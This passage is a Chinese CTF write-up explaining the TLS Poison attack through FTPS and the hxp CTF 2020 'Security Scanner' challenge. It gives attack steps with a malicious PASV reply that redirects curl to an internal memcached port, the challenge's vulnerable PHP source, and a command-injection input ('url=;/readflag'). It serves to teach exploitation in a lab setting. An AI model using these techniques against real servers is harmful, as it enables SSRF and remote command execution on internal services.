&#x6D88;&#x606F;&#x4E2D;&#x770B;&#x5230; TLS Server &#x8BBE;&#x7F6E;&#x7684; Session ID&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>--tls-max 1.2</code>&#x8FEB;&#x4F7F; curl &#x6700;&#x5927;&#x4F7F;&#x7528; TLS 1.2 &#x7248;&#x672C;&#x3002;</p><p>&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x73B0;&#x8C61;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E5F;&#x662F;&#x5728;&#x4F7F;&#x7528;<code>PASV</code>&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x91CD;&#x65B0;&#x4F7F;&#x7528;&#x4E86; Session ID &#x8FDB;&#x884C;&#x5EFA;&#x7ACB; TLS &#x4F1A;&#x8BDD;&#x3002;</p><h3 id="PASV"><a href="#PASV" class="headerlink" title="PASV"></a>PASV</h3><p>&#x65E2;&#x7136;&#x786E;&#x5B9A;&#x4E86;&#x53EF;&#x4EE5;&#x91CD;&#x7528; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F; DNS Rebinding &#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x662F; TLS Poison &#x653B;&#x51FB;&#x4E2D;&#x7684;&#x5173;&#x952E;&#x95EE;&#x9898;&#x3002;</p><p>&#x4F46;&#x662F;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5728;&#x8FC7;&#x53BB;&#x7684;&#x4E00;&#x5E74;&#x5F53;&#x4E2D;&#xFF0C;FTP &#x5728; CTF &#x4E2D;&#x7684;&#x5229;&#x7528;&#x51FA;&#x73B0;&#x5F97;&#x4E5F;&#x7B97;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x4E86;&#xFF0C;&#x5229;&#x7528;&#x4E3B;&#x52A8;&#x3001;&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#x8FDB;&#x884C; SSRF &#x4E5F;&#x4E0D;&#x5E76;&#x4E0D;&#x662F;&#x65B0;&#x9C9C;&#x7684; Trick &#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5; FTPS &#x670D;&#x52A1;&#x7AEF;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x9ED8;&#x8BA4;&#x53D1;&#x9001;&#x7684;<code>PASV</code>&#x547D;&#x4EE4;&#x7ED9;&#x4E88;&#x6076;&#x610F;&#x56DE;&#x590D;&#x4E3A;<code>227 Entering Passive Mode (127,0,0,1,43,203)</code>&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684; &#x201C;DNS Rebinding&#x201D; &#x6548;&#x679C;&#x4E86;&#x3002;</p><p>&#x4F46;&#x662F;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;&#x8FD9;&#x79CD;&#x5C0F; Trick &#x5E94;&#x8BE5;&#x88AB;&#x89C6;&#x4E3A;&#x4E00;&#x79CD;&#x6F0F;&#x6D1E;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x8BBE;&#x8BA1;&#x4E4B;&#x521D;&#xFF0C;&#x672C;&#x6765;&#x5C31;&#x5E94;&#x8BE5;&#x5C06; FTP &#x5BA2;&#x6237;&#x7AEF;&#x3001;&#x670D;&#x52A1;&#x7AEF;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x65E0;&#x8BBA; FTP &#x4F7F;&#x7528;&#x88AB;&#x52A8;&#x8FD8;&#x662F;&#x4E3B;&#x52A8;&#x6A21;&#x5F0F;&#xFF0C;&#x90FD;&#x5E94;&#x8BE5;&#x662F;&#x670D;&#x52A1;&#x7AEF;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x5EFA;&#x7ACB;&#x63A7;&#x5236;&#x6D41;&#x4E0E;&#x6570;&#x636E;&#x6D41;&#xFF0C;&#x5E76;&#x4E0D;&#x5E94;&#x8BE5;&#x4E0E;&#x7B2C;&#x4E09;&#x8005;&#x8FDB;&#x884C;&#xFF0C;&#x51B5;&#x4E14;&#x5982;&#x679C;&#x653B;&#x51FB;&#x8005;&#x6076;&#x610F;&#x5C06;&#x6570;&#x636E;&#x6D41;&#x5B9A;&#x5411;&#x5230;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x5C31;&#x6781;&#x6613;&#x4EA7;&#x751F; SSRF &#x3002;</p><p>&#x6240;&#x4EE5;&#xFF0C;Firefox &#x65E9;&#x5728; 2007 &#x5E74;&#x5C31;&#x4FEE;&#x590D;&#x4E86; FTP &#x5E26;&#x6765;&#x7684;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x5206;&#x914D;&#x4E86; CVE &#x7F16;&#x53F7;&#xFF1A;CVE-2007-1562 &#xFF0C;&#x800C; curl &#x8FDF;&#x8FDF;&#x5728; 2020 &#x5E74;&#x624D;&#x88AB;&#x53D1;&#x73B0;&#x8FD9;&#x7C7B;&#x95EE;&#x9898;&#x5E76;&#x4FEE;&#x590D;&#xFF0C;&#x4E5F;&#x5206;&#x914D;&#x4E86; CVE &#x7F16;&#x53F7;&#xFF1A;CVE-2020-8284&#x3002;curl &#x7248;&#x672C;&#x5728; 4.0 &#x4E0E; 7.73.0 &#x4E4B;&#x95F4;&#x90FD;&#x4F1A;&#x53D7;&#x5230;&#x8BE5;&#x79CD;&#x6F0F;&#x6D1E;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x8BE6;&#x89C1;&#xFF1A;<a href="https://curl.se/docs/CVE-2020-8284.html" target="_blank" rel="noopener">trusting FTP PASV responses</a></p><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E; FTPS &#x6765;&#x8BF4;&#xFF0C;&#x53EA;&#x8981;&#x5B58;&#x5728;<code>PASV</code>&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x5730;&#x4F7F;&#x7528; TLS Poison &#x8FDB;&#x884C;&#x653B;&#x51FB;&#x3002;&#x5177;&#x4F53;&#x6B65;&#x9AA4;&#x4E3A;&#xFF1A;</p><ol><li>curl &#x8BBF;&#x95EE; ftps &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E0E;&#x5176;&#x5EFA;&#x7ACB; tls &#x63E1;&#x624B;</li><li>ftps &#x670D;&#x52A1;&#x5668;&#x5728;&#x5EFA;&#x7ACB; tls &#x8FDE;&#x63A5;&#x65F6;&#x8BBE;&#x7F6E;&#x6076;&#x610F; session id</li><li>ftps &#x5BF9;&#x4E8E; curl &#x53D1;&#x51FA;&#x7684;<code>pasv</code>&#x547D;&#x4EE4;&#x8FD4;&#x56DE;<code>(127,0,0,1,43,203)</code>&#xFF0C;&#x5E76;&#x7B49;&#x5F85;&#x63A5;&#x4E0B;&#x6765;&#x7684;<code>LIST</code>&#x7B49;&#x547D;&#x4EE4;</li><li>&#x4E4B;&#x540E; curl &#x624D;&#x4F1A;&#x4E0E; 127.0.0.1:11211 &#x5C1D;&#x8BD5;&#x91CD;&#x7528; session id &#x5EFA;&#x7ACB; TLS &#x4F1A;&#x8BDD;</li></ol><p>&#x597D;&#x4E86;&#xFF0C;&#x719F;&#x6089;&#x4E86; TLS Poison &#x653B;&#x51FB;&#x4EE5;&#x53CA;&#x786E;&#x5B9A; FTPS &#x4E24;&#x4E2A;&#x5F62;&#x5F0F;&#x90FD;&#x53EF;&#x80FD;&#x53D7;&#x5230; TLS Poison &#x653B;&#x51FB;&#xFF0C;&#x90A3;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x6765;&#x4EB2;&#x81EA;&#x4F53;&#x9A8C;&#x4E00;&#x4E0B;&#x5728; CTF &#x5F53;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x5427;&#x3002;</p><h2 id="HXP-CTF-Security-Scanner"><a href="#HXP-CTF-Security-Scanner" class="headerlink" title="HXP CTF - Security Scanner"></a>HXP CTF - Security Scanner</h2><p>&#x8FD9;&#x662F;&#x6765;&#x81EA; 2020 &#x5E74; hxp CTF &#x5F53;&#x4E2D;&#x7684;&#x4E00;&#x9053; web &#x65B9;&#x5411;&#x9898;&#x76EE;&#xFF0C;&#x5230; hxp &#x6BD4;&#x8D5B;&#x7ED3;&#x675F;&#x53EA;&#x6709;&#x4E24;&#x89E3;&#xFF0C;&#x7B97;&#x662F;&#x4E00;&#x9053;&#x6BD4;&#x8F83;&#x96BE;&#x7684;&#x9898;&#x76EE;&#x3002;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x5176;&#x5B9E;&#x6211;&#x5F88;&#x65E9;&#x5C31;&#x505A;&#x590D;&#x76D8;&#x7684;&#x4E00;&#x4E2A;&#x9898;&#xFF0C;&#x5229;&#x7528;&#x4E86;&#x4ECA;&#x5E74; DEF CON &#x7B49; web &#x7684;&#x65F6;&#x95F4;&#x628A;&#x8FD9;&#x4E2A;&#x9898;&#x505A;&#x4E86;&#x4E00;&#x6B21;&#x7B80;&#x5355;&#x7684;&#x590D;&#x76D8;&#x3002;</p><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>&#x200B;    Finally, after all these years computers are stealing my job.</p><p>Try our new robotic security scanner.</p></blockquote><p>Author: <a href="https://bierbaumer.net/" target="_blank" rel="noopener">0xbb</a> </p><p>&#x4E3B;&#x8981;&#x9898;&#x76EE;&#x6E90;&#x7801;&#xFF1A;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;sandbox&apos;</span>])) {</span><br><span class="line">    $id = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span>(strlen($id) &lt; <span class="hljs-number">10</span>) {</span><br><span class="line">        $b = random_bytes(<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span>(ord($b) &gt; <span class="hljs-number">32</span> &amp;&amp; ord($b) != <span class="hljs-number">0x7f</span>) {</span><br><span class="line">            $id .= $b;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    $_SESSION[<span class="hljs-string">&apos;sandbox&apos;</span>] = $id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;h1&gt;Sandbox&lt;/h1&gt;&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;code&gt;&apos;</span>.base64_encode($_SESSION[<span class="hljs-string">&apos;sandbox&apos;</span>]).<span class="hljs-string">&apos;&lt;/code&gt;&apos;</span>;  </span><br><span class="line"></span><br><span class="line">$m = <span class="hljs-keyword">new</span> Memcached();</span><br><span class="line">$m-&gt;addServer(<span class="hljs-string">&apos;127.0.0.1&apos;</span>, <span class="hljs-number">11211</span>);</span><br><span class="line"></span><br><span class="line">$url = strval($_GET[<span class="hljs-string">&apos;url&apos;</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($m-&gt;get($_SESSION[<span class="hljs-string">&apos;sandbox&apos;</span>].$url) !== <span class="hljs-string">&apos;OK&apos;</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/^[0-9a-zA-Z:\.\/-]{1,64}$/&apos;</span>, $url) !== <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;security :(&apos;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $git_check = <span class="hljs-string">&quot;001e# service=git-upload-pack\n&quot;</span>;</span><br><span class="line">    $data = file_get_contents($url .<span class="hljs-string">&apos;/info/refs?service=git-upload-pack&apos;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($data  === <span class="hljs-keyword">FALSE</span> || substr($data, <span class="hljs-number">0</span>, strlen($git_check)) !== $git_check) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;doesn&apos;t look like git :(&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $m-&gt;set($_SESSION[<span class="hljs-string">&apos;sandbox&apos;</span>].$url, <span class="hljs-string">&apos;OK&apos;</span>, time() + <span class="hljs-number">300</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$output = [];</span><br><span class="line">$return_var = <span class="hljs-number">1</span>;</span><br><span class="line">exec(<span class="hljs-string">&quot;timeout -s KILL 3 git ls-remote --tags -- $url&quot;</span>, $output, $return_var);</span><br><span class="line"><span class="hljs-keyword">if</span>($return_var !== <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;analysis failed :(&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;h1&gt;Analysis&lt;/h1&gt;&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;URL: ${url}&quot;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;h2&gt;Tags&lt;/h2&gt;&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;ul&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">foreach</span>($output <span class="hljs-keyword">as</span> $l) {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;code&gt;${l}&lt;/code&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;/ul&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;h2&gt;Result&lt;/h2&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">TRUE</span>) { <span class="hljs-comment">// patented algorithm (tm)</span></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Likely insecure :(&apos;</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>&#x5BA1;&#x8BA1;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x51FA;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x7684;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p><ul><li>&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x505A; SANDBOX</li><li>&#x7528;&#x6237;&#x8F93;&#x5165; url &#x540E;&#xFF0C;&#x4ECE; Memecached &#x4E2D;&#x83B7;&#x53D6;&#x952E;&#x503C;&#x4E3A; SANDBOX + url &#x7684; Value &#x503C;&#xFF0C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A; &#x201C;OK&#x201D;<ul><li>&#x5982;&#x679C;&#x4E0D;&#x662F;&#xFF0C;&#x901A;&#x8FC7;<code>^[0-9a-zA-Z:\.\/-]{1,64}$</code>&#x6B63;&#x5219;&#x540E;&#xFF0C;&#x901A;&#x8FC7;<code>file_get_contents</code>&#x8BBF;&#x95EE;<code>$url .&apos;/info/refs?service=git-upload-pack&apos;</code>&#xFF0C;&#x68C0;&#x67E5;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x4EE5;<code>001e# service=git-upload-pack\n</code>&#x5F00;&#x5934;<ul><li>&#x5982;&#x679C;&#x4E0D;&#x662F;&#x4EE5;<code>001e# service=git-upload-pack\n</code>&#x5F00;&#x5934;&#xFF0C;&#x5219;&#x7ED3;&#x675F;&#x7A0B;&#x5E8F;</li><li>&#x5982;&#x679C;&#x662F;&#xFF0C;&#x5219;&#x4F1A;&#x5728; Memecached &#x4E2D;&#x5C06;&#x952E;&#x503C;&#x4E3A; SANDBOX + url &#x7684; Value &#x503C;&#x8BBE;&#x7F6E;&#x4E3A; &#x201C;OK&#x201D;&#xFF0C;&#x65F6;&#x95F4;&#x4E3A; 5min</li></ul></li><li>&#x5982;&#x679C;&#x662F; &#x201C;OK&#x201D; &#xFF0C;&#x5219;&#x4F1A;&#x4F7F;&#x7528;<code>exec</code>&#x6267;&#x884C;&#x547D;&#x4EE4;<code>timeout -s KILL 3 git ls-remote --tags -- $url</code>&#xFF0C;&#x5982;&#x679C;&#x8BBF;&#x95EE;&#x6210;&#x529F;&#x5219;&#x8F93;&#x51FA;&#x54CD;&#x5E94;</li></ul></li></ul><p>&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png" alt></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h3><p>From: <a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner</a></p><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x7B2C;&#x4E00;&#x79CD;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F; perfect guesser &#x4ED6;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x7C7B;&#x4F3C;&#x89E3;&#x6CD5;&#xFF0C;&#x901A;&#x8FC7; HTTPS &#x6765;&#x8FDB;&#x884C;&#x89E3;&#x9898;&#x3002;</p><p>&#x9898;&#x76EE;&#x552F;&#x4E00;&#x4E00;&#x5904;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;<code>exec</code>&#x5904;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x6821;&#x9A8C;&#x9A8C;&#x8BC1;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x8FDB;&#x884C; RCE &#xFF0C;&#x4F8B;&#x5982;&#x4F20;&#x5165;<code>url=;/readflag</code>&#xFF0C;&#x8FD9;&#x6837;&#x9898;&#x76EE;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x5982;&#x4E0B;&#x6D41;&#x7A0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img 